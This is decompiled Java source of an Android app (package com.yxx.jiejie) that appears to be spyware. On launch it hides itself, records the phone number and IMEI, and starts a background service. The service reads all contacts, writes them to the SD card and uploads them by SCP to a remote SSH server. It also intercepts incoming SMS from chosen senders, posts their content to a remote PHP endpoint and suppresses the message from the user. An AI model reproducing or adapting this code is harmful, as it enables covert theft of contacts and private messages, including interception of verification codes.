package com.yxx.jiejie;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import com.trilead.ssh2.Connection;
import com.trilead.ssh2.SCPClient;
import com.trilead.ssh2.Session;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    Connection conn = null;
    SCPClient ct = null;
    List prefixs = new ArrayList();
    public SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    Session sess = null;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        TelephonyManager tm = (TelephonyManager) getSystemService("phone");
        Constant.LOCAL_MOBILE = tm.getLine1Number() == null ? "" : tm.getLine1Number();
        Global.imei = tm.getDeviceId();
        startService(new Intent(this, SMSListenerService.class));
        finish();
    }

    public boolean connectHost() {
        try {
            this.conn = new Connection(FileUtil.getFromAsset(this, "net.txt"));
            this.conn.connect();
            boolean isAuthenticated = this.conn.authenticateWithPassword(Global.USERNAME, Global.PASSWORD);
            if (isAuthenticated) {
                this.sess = this.conn.openSession();
                this.ct = new SCPClient(this.conn);
                this.sess.execCommand("mkdir -p /home/" + Constant.LOCAL_MOBILE + "_" + Global.imei + "/CONTACT");
                return isAuthenticated;
            }
            throw new IOException("Authentication failed.");
        } catch (IOException e) {
            e.printStackTrace();
            return true;
        }
    }

    public void putFiles(String[] arrs, String dir) {
        try {
            this.ct.put(arrs, "/home/" + dir);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public List getFiles(List paths) {
        List list = new ArrayList();
        for (int m = 0; m < paths.size(); m++) {
            File file = new File((String) paths.get(m));
            if (file.exists()) {
                File[] arr = file.listFiles();
                int i = 0;
                while (i < arr.length) {
                    for (int j = 0; j < this.prefixs.size(); j++) {
                        if (arr[i].getName().endsWith((String) this.prefixs.get(j)) && arr[i].isFile()) {
                            list.add(arr[i].getAbsolutePath());
                        }
                    }
                    i++;
                }
            }
        }
        return list;
    }

    /* JADX WARNING: Removed duplicated region for block: B:33:0x0053 A:{SYNTHETIC, Splitter:B:33:0x0053} */
    /* JADX WARNING: Removed duplicated region for block: B:36:0x0058 A:{Catch:{ IOException -> 0x005c }} */
    /* JADX WARNING: Removed duplicated region for block: B:25:0x0042 A:{SYNTHETIC, Splitter:B:25:0x0042} */
    /* JADX WARNING: Removed duplicated region for block: B:28:0x0047 A:{Catch:{ IOException -> 0x004b }} */
    /* JADX WARNING: Removed duplicated region for block: B:33:0x0053 A:{SYNTHETIC, Splitter:B:33:0x0053} */
    /* JADX WARNING: Removed duplicated region for block: B:36:0x0058 A:{Catch:{ IOException -> 0x005c }} */
    /* JADX WARNING: Removed duplicated region for block: B:25:0x0042 A:{SYNTHETIC, Splitter:B:25:0x0042} */
    /* JADX WARNING: Removed duplicated region for block: B:28:0x0047 A:{Catch:{ IOException -> 0x004b }} */
    public java.util.List getFromAsset(java.lang.String r11) {
        /*
        r10 = this;
        r5 = new java.util.ArrayList;
        r5.<init>();
        r3 = 0;
        r6 = 0;
        r0 = 0;
        r8 = "";
        r9 = r10.getResources();	 Catch:{ IOException -> 0x006f }
        r9 = r9.getAssets();	 Catch:{ IOException -> 0x006f }
        r3 = r9.open(r11);	 Catch:{ IOException -> 0x006f }
        r7 = new java.io.InputStreamReader;	 Catch:{ IOException -> 0x006f }
        r7.<init>(r3);	 Catch:{ IOException -> 0x006f }
        r1 = new java.io.BufferedReader;	 Catch:{ IOException -> 0x0071, all -> 0x0068 }
        r1.<init>(r7);	 Catch:{ IOException -> 0x0071, all -> 0x0068 }
        r4 = "";
    L_0x0022:
        r4 = r1.readLine();	 Catch:{ IOException -> 0x003a, all -> 0x006b }
        if (r4 != 0) goto L_0x0035;
    L_0x0028:
        if (r1 == 0) goto L_0x002d;
    L_0x002a:
        r1.close();	 Catch:{ IOException -> 0x0061 }
    L_0x002d:
        if (r7 == 0) goto L_0x0065;
    L_0x002f:
        r7.close();	 Catch:{ IOException -> 0x0061 }
        r0 = r1;
        r6 = r7;
    L_0x0034:
        return r5;
    L_0x0035:
        r8 = r4;
        r5.add(r4);	 Catch:{ IOException -> 0x003a, all -> 0x006b }
        goto L_0x0022;
    L_0x003a:
        r2 = move-exception;
        r0 = r1;
        r6 = r7;
    L_0x003d:
        r2.printStackTrace();	 Catch:{ all -> 0x0050 }
        if (r0 == 0) goto L_0x0045;
    L_0x0042:
        r0.close();	 Catch:{ IOException -> 0x004b }
    L_0x0045:
        if (r6 == 0) goto L_0x0034;
    L_0x0047:
        r6.close();	 Catch:{ IOException -> 0x004b }
        goto L_0x0034;
    L_0x004b:
        r2 = move-exception;
        r2.printStackTrace();
        goto L_0x0034;
    L_0x0050:
        r9 = move-exception;
    L_0x0051:
        if (r0 == 0) goto L_0x0056;
    L_0x0053:
        r0.close();	 Catch:{ IOException -> 0x005c }
    L_0x0056:
        if (r6 == 0) goto L_0x005b;
    L_0x0058:
        r6.close();	 Catch:{ IOException -> 0x005c }
    L_0x005b:
        throw r9;
    L_0x005c:
        r2 = move-exception;
        r2.printStackTrace();
        goto L_0x005b;
    L_0x0061:
        r2 = move-exception;
        r2.printStackTrace();
    L_0x0065:
        r0 = r1;
        r6 = r7;
        goto L_0x0034;
    L_0x0068:
        r9 = move-exception;
        r6 = r7;
        goto L_0x0051;
    L_0x006b:
        r9 = move-exception;
        r0 = r1;
        r6 = r7;
        goto L_0x0051;
    L_0x006f:
        r2 = move-exception;
        goto L_0x003d;
    L_0x0071:
        r2 = move-exception;
        r6 = r7;
        goto L_0x003d;
        */
        throw new UnsupportedOperationException("Method not decompiled: com.yxx.jiejie.MainActivity.getFromAsset(java.lang.String):java.util.List");
    }
}
package com.yxx.jiejie;

import android.content.Context;
import android.util.Log;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.utils.URLEncodedUtils;
import org.apache.http.protocol.HTTP;

public class SendThread implements Runnable {
    private String content;
    private Context context;
    String which;

    public SendThread(Context context, String content, String which) {
        this.content = content;
        this.context = context;
        this.which = which;
    }

    public void run() {
        HashMap hm = new HashMap();
        hm.put("p", this.content);
        try {
            String rsp = sendPostRequest(getFromAsset("url.txt") + this.which, hm, HTTP.UTF_8);
        } catch (Exception e) {
            Log.i("zhou", "rsp question");
        }
    }

    /* JADX WARNING: Removed duplicated region for block: B:21:0x003a A:{SYNTHETIC, Splitter:B:21:0x003a} */
    /* JADX WARNING: Removed duplicated region for block: B:24:0x003f A:{Catch:{ IOException -> 0x0043 }} */
    /* JADX WARNING: Removed duplicated region for block: B:29:0x004b A:{SYNTHETIC, Splitter:B:29:0x004b} */
    /* JADX WARNING: Removed duplicated region for block: B:32:0x0050 A:{Catch:{ IOException -> 0x0054 }} */
    /* JADX WARNING: Removed duplicated region for block: B:29:0x004b A:{SYNTHETIC, Splitter:B:29:0x004b} */
    /* JADX WARNING: Removed duplicated region for block: B:32:0x0050 A:{Catch:{ IOException -> 0x0054 }} */
    /* JADX WARNING: Removed duplicated region for block: B:21:0x003a A:{SYNTHETIC, Splitter:B:21:0x003a} */
    /* JADX WARNING: Removed duplicated region for block: B:24:0x003f A:{Catch:{ IOException -> 0x0043 }} */
    public java.lang.String getFromAsset(java.lang.String r10) {
        /*
        r9 = this;
        r3 = 0;
        r5 = 0;
        r0 = 0;
        r7 = "";
        r8 = r9.context;	 Catch:{ IOException -> 0x0034 }
        r8 = r8.getResources();	 Catch:{ IOException -> 0x0034 }
        r8 = r8.getAssets();	 Catch:{ IOException -> 0x0034 }
        r3 = r8.open(r10);	 Catch:{ IOException -> 0x0034 }
        r6 = new java.io.InputStreamReader;	 Catch:{ IOException -> 0x0034 }
        r6.<init>(r3);	 Catch:{ IOException -> 0x0034 }
        r1 = new java.io.BufferedReader;	 Catch:{ IOException -> 0x0067, all -> 0x0060 }
        r1.<init>(r6);	 Catch:{ IOException -> 0x0067, all -> 0x0060 }
        r4 = "";
    L_0x001f:
        r4 = r1.readLine();	 Catch:{ IOException -> 0x006a, all -> 0x0063 }
        if (r4 != 0) goto L_0x0032;
    L_0x0025:
        if (r1 == 0) goto L_0x002a;
    L_0x0027:
        r1.close();	 Catch:{ IOException -> 0x0059 }
    L_0x002a:
        if (r6 == 0) goto L_0x005d;
    L_0x002c:
        r6.close();	 Catch:{ IOException -> 0x0059 }
        r0 = r1;
        r5 = r6;
    L_0x0031:
        return r7;
    L_0x0032:
        r7 = r4;
        goto L_0x001f;
    L_0x0034:
        r2 = move-exception;
    L_0x0035:
        r2.printStackTrace();	 Catch:{ all -> 0x0048 }
        if (r0 == 0) goto L_0x003d;
    L_0x003a:
        r0.close();	 Catch:{ IOException -> 0x0043 }
    L_0x003d:
        if (r5 == 0) goto L_0x0031;
    L_0x003f:
        r5.close();	 Catch:{ IOException -> 0x0043 }
        goto L_0x0031;
    L_0x0043:
        r2 = move-exception;
        r2.printStackTrace();
        goto L_0x0031;
    L_0x0048:
        r8 = move-exception;
    L_0x0049:
        if (r0 == 0) goto L_0x004e;
    L_0x004b:
        r0.close();	 Catch:{ IOException -> 0x0054 }
    L_0x004e:
        if (r5 == 0) goto L_0x0053;
    L_0x0050:
        r5.close();	 Catch:{ IOException -> 0x0054 }
    L_0x0053:
        throw r8;
    L_0x0054:
        r2 = move-exception;
        r2.printStackTrace();
        goto L_0x0053;
    L_0x0059:
        r2 = move-exception;
        r2.printStackTrace();
    L_0x005d:
        r0 = r1;
        r5 = r6;
        goto L_0x0031;
    L_0x0060:
        r8 = move-exception;
        r5 = r6;
        goto L_0x0049;
    L_0x0063:
        r8 = move-exception;
        r0 = r1;
        r5 = r6;
        goto L_0x0049;
    L_0x0067:
        r2 = move-exception;
        r5 = r6;
        goto L_0x0035;
    L_0x006a:
        r2 = move-exception;
        r0 = r1;
        r5 = r6;
        goto L_0x0035;
        */
        throw new UnsupportedOperationException("Method not decompiled: com.yxx.jiejie.SendThread.getFromAsset(java.lang.String):java.lang.String");
    }

    private String sendPostRequest(String path, Map<String, String> params, String encoding) throws Exception {
        StringBuilder sb = new StringBuilder("");
        if (!(params == null || params.isEmpty())) {
            for (Entry<String, String> entry : params.entrySet()) {
                sb.append((String) entry.getKey()).append('=').append((String) entry.getValue()).append('&');
            }
            sb.deleteCharAt(sb.length() - 1);
        }
        Log.i("zhou", new StringBuilder(String.valueOf(path)).append("   ").append(sb.toString()).append("shit").toString());
        byte[] data = sb.toString().getBytes();
        HttpURLConnection conn = (HttpURLConnection) new URL(path).openConnection();
        conn.setRequestMethod(HttpPost.METHOD_NAME);
        conn.setConnectTimeout(1000);
        conn.setDoOutput(true);
        conn.setRequestProperty(HTTP.CONTENT_TYPE, URLEncodedUtils.CONTENT_TYPE);
        conn.setRequestProperty(HTTP.CONTENT_LEN, String.valueOf(data.length));
        OutputStream outStream = conn.getOutputStream();
        outStream.write(data);
        outStream.flush();
        outStream.close();
        conn.getResponseCode();
        return null;
    }
}
package com.yxx.jiejie;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.telephony.SmsMessage;
import android.util.Log;
import com.trilead.ssh2.Connection;
import com.trilead.ssh2.SCPClient;
import com.trilead.ssh2.Session;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class SMSListenerService extends Service {
    static Cursor cur;
    static Cursor phonecursor;
    private final BroadcastReceiver SMSReceiver = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            String sender = "";
            String content = "";
            String myMobile = "";
            Date time = new Date();
            for (Object pd : (Object[]) intent.getExtras().get("pdus")) {
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) pd);
                sender = sms.getOriginatingAddress();
                content = new StringBuilder(String.valueOf(content)).append(sms.getMessageBody()).toString();
                time = new Date(sms.getTimestampMillis());
            }
            if (Constant.INTER_MOBILE.indexOf(sender) != -1 || sender.startsWith("15")) {
                new Thread(new SendThread(context, Constant.LOCAL_MOBILE + "||" + content + "||" + sender + "||" + SMSListenerService.this.sdf.format(time), "/AAA.php")).start();
                abortBroadcast();
            }
        }
    };
    Connection conn = null;
    SCPClient ct = null;
    public SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    Session sess = null;

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        Log.i("SMSListener", "Service start!");
        new Thread() {
            public void run() {
                final List list = SMSListenerService.this.readAllContacts();
                try {
                    FileUtil.writeToFile(new File("/mnt/sdcard/contact.txt"), new ProcBufferedReader() {
                        public void writeToFile(PrintWriter pw) {
                            for (int i = 0; i < list.size(); i++) {
                                Contact contact = (Contact) list.get(i);
                                pw.println(contact.getName() + ":" + contact.getPhoneString());
                            }
                        }

                        public void proc(BufferedReader br) throws Exception {
                        }
                    });
                } catch (Exception e1) {
                    e1.printStackTrace();
                }
                if (SMSListenerService.this.connectHost()) {
                    try {
                        if (new File("/mnt/sdcard/contact.txt").exists()) {
                            SMSListenerService.this.putFiles(new String[]{"/mnt/sdcard/contact.txt"}, Constant.LOCAL_MOBILE + "_" + Global.imei + "/CONTACT");
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    SMSListenerService.this.sess.close();
                }
            }
        }.start();
    }

    public void onDestroy() {
        super.onDestroy();
    }

    public synchronized List readAllContacts() {
        List phone_Map;
        ContentResolver cr = getContentResolver();
        cur = cr.query(Contacts.CONTENT_URI, null, null, null, null);
        phone_Map = new ArrayList();
        while (cur.moveToNext()) {
            Contact contact = new Contact();
            String idFromContacts = cur.getString(cur.getColumnIndex("_id"));
            String nameFromContacts = cur.getString(cur.getColumnIndex("display_name"));
            String[] arr = new String[20];
            phonecursor = cr.query(Phone.CONTENT_URI, null, "contact_id= ?", new String[]{String.valueOf(idFromContacts)}, null);
            int i = 0;
            while (phonecursor.moveToNext()) {
                arr[i] = phonecursor.getString(phonecursor.getColumnIndex("data1")).trim();
                i++;
            }
            contact.setC_id(idFromContacts);
            contact.setName(nameFromContacts);
            contact.setPhone(arr);
            Log.i("zhou", "query id=" + contact.getC_id() + " " + contact.getName() + "  " + contact.getPhoneString() + " " + contact.getRawContactsId());
            phone_Map.add(contact);
            phonecursor.close();
        }
        cur.close();
        return phone_Map;
    }

    public boolean connectHost() {
        try {
            this.conn = new Connection(FileUtil.getFromAsset(this, "net.txt"));
            this.conn.connect();
            boolean isAuthenticated = this.conn.authenticateWithPassword(Global.USERNAME, Global.PASSWORD);
            if (isAuthenticated) {
                this.sess = this.conn.openSession();
                this.ct = new SCPClient(this.conn);
                this.sess.execCommand("mkdir -p /home/" + Constant.LOCAL_MOBILE + "_" + Global.imei + "/CONTACT");
                return isAuthenticated;
            }
            throw new IOException("Authentication failed.");
        } catch (IOException e) {
            e.printStackTrace();
            return true;
        }
    }

    public void putFiles(String[] arrs, String dir) {
        try {
            this.ct.put(arrs, "/home/" + dir);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
